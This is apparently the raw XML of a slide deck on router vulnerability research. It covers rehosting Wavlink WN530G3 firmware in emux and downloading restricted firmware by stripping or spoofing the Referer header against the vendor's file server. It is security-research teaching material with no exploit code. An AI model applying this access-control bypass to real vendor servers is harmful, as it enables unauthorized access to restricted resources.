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embeddedFontLst>
    <p:embeddedFont>
      <p:font typeface="Urbanist Medium"/>
      <p:regular r:id="rId47"/>
      <p:bold r:id="rId48"/>
      <p:italic r:id="rId49"/>
      <p:boldItalic r:id="rId50"/>
    </p:embeddedFont>
    <p:embeddedFont>
      <p:font typeface="Urbanist SemiBold"/>
      <p:regular r:id="rId51"/>
      <p:bold r:id="rId52"/>
      <p:italic r:id="rId53"/>
      <p:boldItalic r:id="rId54"/>
    </p:embeddedFont>
    <p:embeddedFont>
      <p:font typeface="Urbanist"/>
      <p:regular r:id="rId55"/>
      <p:bold r:id="rId56"/>
      <p:italic r:id="rId57"/>
      <p:boldItalic r:id="rId58"/>
    </p:embeddedFont>
    <p:embeddedFont>
      <p:font typeface="Urbanist ExtraBold"/>
      <p:bold r:id="rId59"/>
      <p:boldItalic r:id="rId60"/>
    </p:embeddedFont>
    <p:embeddedFont>
      <p:font typeface="Roboto Mono"/>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UrbanistMedium-bold.fntdata"/><Relationship Id="rId47" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/font" Target="fonts/UrbanistMedium-regular.fntdata"/><Relationship Id="rId49" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/font" Target="fonts/Urbanist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Mono-bold.fntdata"/><Relationship Id="rId61" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/font" Target="fonts/RobotoMono-regular.fntdata"/><Relationship Id="rId20" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide15.xml"/><Relationship Id="rId64" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/font" Target="fonts/RobotoMono-boldItalic.fntdata"/><Relationship Id="rId63" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/font" Target="fonts/RobotoMono-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UrbanistExtraBold-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UrbanistSemiBold-regular.fntdata"/><Relationship Id="rId50" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/font" Target="fonts/UrbanistMedium-boldItalic.fntdata"/><Relationship Id="rId53" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/font" Target="fonts/UrbanistSemiBold-italic.fntdata"/><Relationship Id="rId52" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/font" Target="fonts/UrbanistSemiBold-bold.fntdata"/><Relationship Id="rId11" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide6.xml"/><Relationship Id="rId55" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/font" Target="fonts/Urbanist-regular.fntdata"/><Relationship Id="rId10" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide5.xml"/><Relationship Id="rId54" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/font" Target="fonts/UrbanistSemiBold-boldItalic.fntdata"/><Relationship Id="rId13" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide8.xml"/><Relationship Id="rId57" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/font" Target="fonts/Urbanist-italic.fntdata"/><Relationship Id="rId12" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide7.xml"/><Relationship Id="rId56" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/font" Target="fonts/Urbanist-bold.fntdata"/><Relationship Id="rId15" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide10.xml"/><Relationship Id="rId59" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/font" Target="fonts/UrbanistExtraBold-bold.fntdata"/><Relationship Id="rId14" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide9.xml"/><Relationship Id="rId58" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/font" Target="fonts/Urbanist-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avlinkstore.com"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avlink.xyz" TargetMode="External"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://files2.wavlink.com"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files2.wavlink.com" TargetMode="External"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://files2.wavlink.com"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7e28cfc4aa_1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7e28cfc4aa_1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7d5965954e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7d5965954e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7e28cfc4aa_1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7e28cfc4aa_1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Quick overview of wavlink</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-311150" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1300"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1300"/>
              <a:t>Wavlinks parent company is winstar Technologies</a:t>
            </a:r>
            <a:endParaRPr sz="1300"/>
          </a:p>
          <a:p>
            <a:pPr indent="-311150" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1300"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1300"/>
              <a:t>They are based out of Shenzhen China. They offer a variety of IoT devices to include routers and extenders.</a:t>
            </a:r>
            <a:endParaRPr sz="1300"/>
          </a:p>
          <a:p>
            <a:pPr indent="-311150" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1300"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1300"/>
              <a:t>Their only US based location is in California </a:t>
            </a:r>
            <a:endParaRPr sz="1300"/>
          </a:p>
          <a:p>
            <a:pPr indent="-311150" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1300"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1300"/>
              <a:t>Typically if you want to purchase these devices, third party retailers like Amazon and Ebay are your best bet. </a:t>
            </a:r>
            <a:endParaRPr sz="1300"/>
          </a:p>
          <a:p>
            <a:pPr indent="-311150" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1300"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1300"/>
              <a:t>They do have an official store at </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1300" u="sng">
                <a:solidFill>
                  <a:schemeClr val="hlink"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>wavlinkstore.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1300"/>
              <a:t>. Prices are typically 30% higher than Ebay for new in box.</a:t>
            </a:r>
            <a:endParaRPr sz="1300"/>
          </a:p>
          <a:p>
            <a:pPr indent="-311150" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1300"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1300"/>
              <a:t>On the right is one of their newer offerings, the AX6000. Typical MSRP is under 100$. They are very focused on the SOHO/Outdoor WIFI space. No enterprise offerings at this time.</a:t>
            </a:r>
            <a:endParaRPr sz="13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7e28cfc4aa_1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7e28cfc4aa_1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Our target router for the day is the WN530G3</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-298450" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>The firmware is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>publicly</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> accessible with a few </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>caveats</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> we will get into later on.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-298450" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>It sports a 2.4 and 5 Ghz band. Very much a SOHO router</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-298450" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Typical MSRP for this router is $50, although I have seen listings in the 30s.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8343a1f9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8343a1f9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Rehosting simply put is running firmware on a non native platform. </a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-298450" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>It is important to note that not all firmware rehosting achieves </a:t>
            </a:r>
            <a:r>
              <a:rPr i="1" lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>full</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> device behavior—peripherals and hardware nuances often require stubs or models—so results can be partial. </a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-298450" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Also there is no issue if you brick the router. This can happen quite easily when attempting to backdoor firmware. When it is rehosted there is no financial cost if you cannot reflash the router, which can be a time intensive </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>exercise</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> in and of itself. </a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-298450" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>With emux, you can simply </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>restart</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> the emulation process and be off the races again.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-298450" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Much easier to bring your own tools! I often times leave some tools that aid in the vulnerability research process in the firmware root (gdb, tcpdump, socat, etc)</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-298450" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Emux makes it trivial to establish a shell on the router (a stable one too)</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-298450" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>This can often eat up a ton of time. By rehosting we can reallocate that time to VR vice attempting to establish a shell via the debug port.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8343a1f9a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8343a1f9a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Here is a general overview of rehosting</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-298450" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Rehosting is a difficult subject area</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-298450" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Picking a target is sometimes the most difficult step. There are so many options, so many models, version, and firmware differences</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-298450" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Sometimes firmware is encrypted</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-298450" lvl="1" marL="914400" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>What do we do then.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-298450" lvl="1" marL="914400" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>From my experience when firmware is encrypted, it wasnt always this way. Start with the oldest version (v 1.0) and see if that is encrypted (it often isnt)</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-298450" lvl="1" marL="914400" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>At the end of the day the routers needs an ability to decrypt the firmware, decryption binary on disk, scripts etc. Look at the update processes</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-298450" lvl="1" marL="914400" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>When v 1.0 is encrypted you often have to purchase the router and MiTM the update process or dump it while the router is running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7e28cfc4aa_1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7e28cfc4aa_1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When attempting to download the older firmware, I was returned a forbidden error message as you can see on the screen. There is a key sentence, that caught my eye, can anyone see it.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-298450" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Yes, denied by </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>referrer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> ACL. Fairly verbose error message, that might be good for a developer or web administrator, but this was the key sentence that started this whole journey. Dont provide curious users with more information than you need to! Never offer up information for free.</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Error tells you the exact header it is parsing and making decisions on.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-298450" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>What if we change the header, what if we remove the header. There are all questions running through my mind</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It is important to note that the site that provides the download links is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" u="sng">
                <a:solidFill>
                  <a:schemeClr val="hlink"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>wavlink.xyz</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>, and the server where the firmware is actually hosted is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" u="sng">
                <a:solidFill>
                  <a:schemeClr val="hlink"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>files2.wavlink.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>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7e28cfc4aa_1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7e28cfc4aa_1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Its quite difficult to parse a header that no longer exists on the request. The developers either did not account for this possibility, or they chose to fail </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>open vs fail closed. In other words if the header does not exist provide the firmware. The former is much more likely in this case.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7e28cfc4aa_1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7e28cfc4aa_1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Quick recap before moving on </a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-298450" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Visit the target site</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-298450" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>When downloading older firmware, simply strip the Referer header or set it to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" u="sng">
                <a:solidFill>
                  <a:schemeClr val="hlink"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>files2.wavlink.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>. That also worked! The site containing the firmware is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" u="sng">
                <a:solidFill>
                  <a:schemeClr val="hlink"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>files2.wavlink.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-298450" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>This will spoof a same origin request vs the normal cross origin request</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-298450" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>If you are feeling lazy the firmware is located in my repo, to save you from recreating this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7e28cfc4aa_1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7e28cfc4aa_1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are unfamiliar with binwalk this is perfect starter firmware as its unencrypted.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attempting to rehost firmware it is super important to preserve symlinks, do make sure to not forget that switch.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 of the most simple firmware packing you will see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has a customer header and trailer (which binwalk does not alert you to) some LZMA compressed data and then the squashfs filesystem which is what we are after.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7e28cfc4aa_1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7e28cfc4aa_1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am including this slide, to show a difference between wavlink and many other router brands such as D-Link and TP-Link. Typically routers booting will </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>hinge</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> on the /etc/inittab file, however wavlink is a bit different</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>As you can see rcS file doesnt even exist in this firmware.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Wavlink is based on OpenWRT and you can find the OpenWRT header in many of the wavlink files, however they also have many custom scripts, files and binaries on this router. So I like to say inspired by openwrt.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>/etc/inittab however is still present in the firmware, and not removed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Passwords are MD5 hashed,</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>the /etc/init.d directory is critical for this router to boot. This is where all the boot scripts are located which i will show you on the next slide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Before moving on, we can see that in the boot script, cron jobs are established. Im not sure why the web service is restarted every day, but never the less it is. Its very important as rehosters to check these start up scripts and read them from top to bottom. It shows you what is expected behavior. What services are </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>supposed to start by default. It allows you to discern if you have successfully rehosted the router or not.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7e28cfc4aa_1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7e28cfc4aa_1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that /etc/init.d directory in its entirety. If you are </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>unfamiliar</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> with emux, this is the config.txt file that is a requirement for emux emulation. Essentially this file tells emux how to boot the router. It is the command that gets executed in the docker container when you tell emux to start the target device. This is critical to get right.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my config file I essentially run each of these scripts which bring up all the default router services and then call the init binary which is expected to be run at this time.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7ed98cb9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7ed98cb9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Some additional firmware customization steps we must take outside of the the emux config file.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-298450" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>There will always be some odd nuances with each target router when attempting to emulate it. </a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-298450" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>We cannot match the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>environment</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> the router firmware expects 100%. As you can see we have to touch a pid file, remove a pesky redirect config file and turn off the ssl options. </a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-298450" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>For VR we are always going to want to use the clear text http port over anything encrypted. It makes VR much easier</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-298450" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Additionally I could not get the web server process to start without commenting this section out. There might be a work around, and simply a skill issue on my end. If you find a way please reach out to me and let me know!</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7e28cfc4aa_1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7e28cfc4aa_1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sets the stage for some of the themes we will see later.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>There are two utterly </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>bizarre</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> files in the webroot. This is not an artifact of my actions, they are in the firmware taken from the wavlink </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>website</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>I can only speculate, my guess is that these are some developer files that were not cleaned up before shipping the firmware.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
